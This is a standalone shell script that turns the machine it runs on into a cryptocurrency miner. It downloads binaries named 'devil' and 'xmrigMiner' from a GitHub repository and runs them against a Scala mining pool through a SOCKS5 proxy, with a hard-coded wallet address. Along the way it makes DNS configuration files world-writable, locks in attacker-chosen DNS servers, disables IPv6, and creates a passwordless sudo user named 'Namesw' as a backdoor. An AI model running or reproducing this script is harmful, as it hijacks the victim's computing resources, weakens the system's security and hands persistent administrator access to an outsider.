#!/bin/sh
sudo apt-get update
sudo apt-get install screen libjansson4 -y
sudo chmod 777 edan.sh && sudo chmod +x edan.sh
sudo chmod 777 /etc/sysctl.conf && sudo chmod 777 /etc/resolv.conf
sudo echo 128 > /proc/sys/vm/nr_hugepages
sudo sysctl -w vm.nr_hugepages=128
sudo echo '' >/etc/resolv.conf
sudo echo -e 'nameserver 205.171.3.66\nnameserver 205.171.202.166' >/etc/resolv.conf
sudo chattr -f  +i /etc/resolv.conf
sudo systemctl restart systemd-networkd
sudo chmod 777 /etc/systemd/resolved.conf
sudo echo '' >/etc/systemd/resolved.conf
sudo echo -e 'DNS=205.171.3.66 \nFallbackDNS=205.171.202.166' >/etc/systemd/resolved.conf
sudo screen -dmS satu systemctl status systemd-resolved
sudo ufw allow out 53,113,123/udp
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1
sudo adduser --force-badname --disabled-password --gecos "" Namesw
sudo usermod -a -G sudo Namesw
wget https://github.com/buyutuk/totol/raw/masif/devil
wget https://github.com/buyutuk/totol/raw/masif/xmrigMiner
chmod +x xmrigMiner && sudo chmod 777 devil
./devil --donate-level 1 -a panthera -o scala.herominers.com:10131 -u SvjkGXX5eqGWU2y4185Ez7EJMPhrLopc5fGSKyJzZd25WZioaBgFGq2b6fk5di4hjuVcWLW2jC3Ba7KyD7ehsD4g1JnxDBsEz -p $(shuf -i 10-9999999999999999999 -n 1) -k -x socks5://72.210.252.134:46164 -t 2
while [ 1 ]; do
sleep 3
done
sleep 999
